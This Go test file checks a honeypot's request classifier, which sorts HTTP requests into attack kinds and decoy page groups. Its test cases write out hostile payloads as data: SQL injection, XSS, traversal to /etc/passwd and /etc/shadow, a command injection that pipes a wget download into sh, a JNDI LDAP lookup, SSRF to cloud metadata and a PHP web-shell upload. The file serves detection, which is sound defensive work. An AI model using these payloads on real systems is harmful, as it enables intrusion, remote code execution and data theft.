package honeypot

import (
	"net/http/httptest"
	"strings"
	"testing"
)

func TestSensorClassify(t *testing.T) {
	const browser = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0 Safari/537.36"
	cases := []struct {
		name, method, target, body, ua string
		hdr                            map[string]string
		kind, tag                      string
	}{
		{"sqli union", "GET", "/item.php?id=1%27%20UNION%20ALL%20SELECT%20username,password%20FROM%20users--", "", browser, nil, KindHTTPSQLi, "sqli"},
		{"sqli sleep", "GET", "/?q=1%20AND%20SLEEP(5)", "", browser, nil, KindHTTPSQLi, "sqli"},
		{"sqli body", "POST", "/login", "user=admin%27--&pass=x", browser, nil, KindHTTPSQLi, "sqli"},
		{"xss", "GET", "/search?q=%3Cscript%3Ealert(1)%3C/script%3E", "", browser, nil, KindHTTPXSS, "xss"},
		{"xss handler", "GET", "/?n=%22%3E%3Cimg%20src=x%20onerror=alert(document.cookie)%3E", "", browser, nil, KindHTTPXSS, "xss"},
		{"traversal", "GET", "/index.php?page=../../../../etc/passwd", "", browser, nil, KindHTTPTrav, "traversal"},
		{"traversal encoded", "GET", "/static/%252e%252e/%252e%252e/etc/shadow", "", browser, nil, KindHTTPTrav, "traversal"},
		{"lfi wrapper", "GET", "/?file=php://filter/convert.base64-encode/resource=index.php", "", browser, nil, KindHTTPTrav, "traversal"},
		{"rce", "GET", "/ping?host=127.0.0.1;cat%20/etc/passwd", "", browser, nil, KindHTTPRCE, "rce"},
		{"rce wget", "POST", "/boaform/admin/formPing", "target_addr=;wget%20http://1.2.3.4/m.sh%20-O-|sh", browser, nil, KindHTTPRCE, "rce"},
		{"rce thinkphp", "GET", "/index.php?s=/Index/think%5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=x", "", browser, nil, KindHTTPRCE, "rce"},
		{"jndi header", "GET", "/", "", browser, map[string]string{"X-Api-Version": "${jndi:ldap://203.0.113.5:1389/a}"}, KindHTTPJNDI, "jndi"},
		{"jndi obfuscated", "GET", "/?x=$%7B$%7B::-j%7Dndi:rmi://x/y%7D", "", browser, nil, KindHTTPJNDI, "jndi"},
		{"ssrf", "GET", "/fetch?url=http://169.254.169.254/latest/meta-data/", "", browser, nil, KindHTTPSSRF, "ssrf"},
		{"ssrf local", "GET", "/proxy?target=http://127.0.0.1:8080/admin", "", browser, nil, KindHTTPSSRF, "ssrf"},
		{"upload", "POST", "/upload.php", "--x\r\nContent-Disposition: form-data; name=\"f\"; filename=\"shell.php\"\r\n\r\n<?php system($_GET['c']); ?>\r\n--x--", browser, map[string]string{"Content-Type": "multipart/form-data; boundary=x"}, KindHTTPRCE, "upload"},
		{"webshell", "GET", "/wp-content/uploads/wso.php", "", browser, nil, KindHTTPUpload, "upload"},
		{"git", "GET", "/.git/config", "", browser, nil, KindHTTPExploit, "path:/.git/"},
		{"phpunit", "POST", "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "", browser, nil, KindHTTPExploit, "path:/vendor/phpunit/"},
		{"hnap", "GET", "/HNAP1/", "", browser, nil, KindHTTPExploit, "path:/hnap1"},
		{"actuator", "GET", "/actuator/env", "", browser, nil, KindHTTPExploit, "path:/actuator"},
		{"wp plugin", "GET", "/wp-content/plugins/revslider/readme.txt", "", browser, nil, KindHTTPExploit, "path:/wp-content/plugins/"},
		{"bad ua", "GET", "/", "", "Mozilla/5.0 zgrab/0.x", nil, KindBadUA, "ua:zgrab"},
		{"nmap", "GET", "/nmaplowercheck1700000000", "", "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)", nil, KindBadUA, "ua:nmap"},
		{"sqlmap", "GET", "/", "", "sqlmap/1.8#stable (https://sqlmap.org)", nil, KindBadUA, "ua:sqlmap"},
		{"nuclei", "GET", "/", "", "Mozilla/5.0 (compatible; Nuclei - Open-source project (github.com/projectdiscovery/nuclei))", nil, KindBadUA, "ua:nuclei"},
		{"censys", "GET", "/", "", "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)", nil, KindScannerResch, "research:censys"},
		{"shodan", "GET", "/", "", "Mozilla/5.0 (compatible; Shodan; https://shodan.io)", nil, KindScannerResch, "research:shodan"},
		{"leakix", "GET", "/.env", "", "Mozilla/5.0 (l9explore/1.2.2)", nil, KindScannerResch, "path:/.env"},
		{"stretchoid", "GET", "/", "", "Mozilla/5.0 (compatible; Stretchoid; +https://stretchoid.com/)", nil, KindScannerResch, "research:stretchoid"},
		{"plain", "GET", "/robots.txt", "", browser, map[string]string{"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Accept-Language": "de-DE,de;q=0.9,en;q=0.8"}, "", ""},
		{"plain query", "GET", "/?q=hello+world&id=5&cat=2&echo=1", "", browser, nil, "", ""},
		{"login page", "GET", "/wp-login.php", "", browser, nil, "", ""},
		{"form login", "POST", "/wp-login.php", "log=admin&pwd=P%40ssw0rd%21&wp-submit=Log+In", browser, nil, "", ""},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			var r = httptest.NewRequest(c.method, c.target, strings.NewReader(c.body))
			r.Header.Set("User-Agent", c.ua)
			for k, v := range c.hdr {
				r.Header.Set(k, v)
			}
			kind, tags := sensorClassify(r, []byte(c.body))
			if kind != c.kind {
				t.Fatalf("Art %q, erwartet %q (tags %v)", kind, c.kind, tags)
			}
			if c.tag == "" && len(tags) > 0 {
				t.Fatalf("unerwartete Treffer %v", tags)
			}
			if c.tag != "" && !strings.Contains(","+strings.Join(tags, ",")+",", ","+c.tag+",") {
				t.Fatalf("Treffer %v ohne %q", tags, c.tag)
			}
		})
	}
}

func TestSensorPageGroup(t *testing.T) {
	for path, want := range map[string]string{
		"/": "generic", "/index.php": "generic", "/wp-login.php": "wp-login", "/blog/wp-login.php": "wp-login",
		"/wp-admin/": "wp-login", "/phpmyadmin/": "phpmyadmin", "/phpMyAdmin/index.php": "phpmyadmin", "/pma": "phpmyadmin",
		"/admin": "admin", "/admin/login": "admin", "/login": "admin", "/administrator/": "admin",
		"/robots.txt": "", "/admin/config/x": "", "/phpmyadmin/setup/": "",
	} {
		if got := sensorPageGroup(path); got != want {
			t.Errorf("%s: %q, erwartet %q", path, got, want)
		}
	}
	if sensorPageFor("admin", "/wp-login.php") != "admin" || sensorPageFor("admin", "/robots.txt") != "" {
		t.Error("fester Koeder")
	}
}
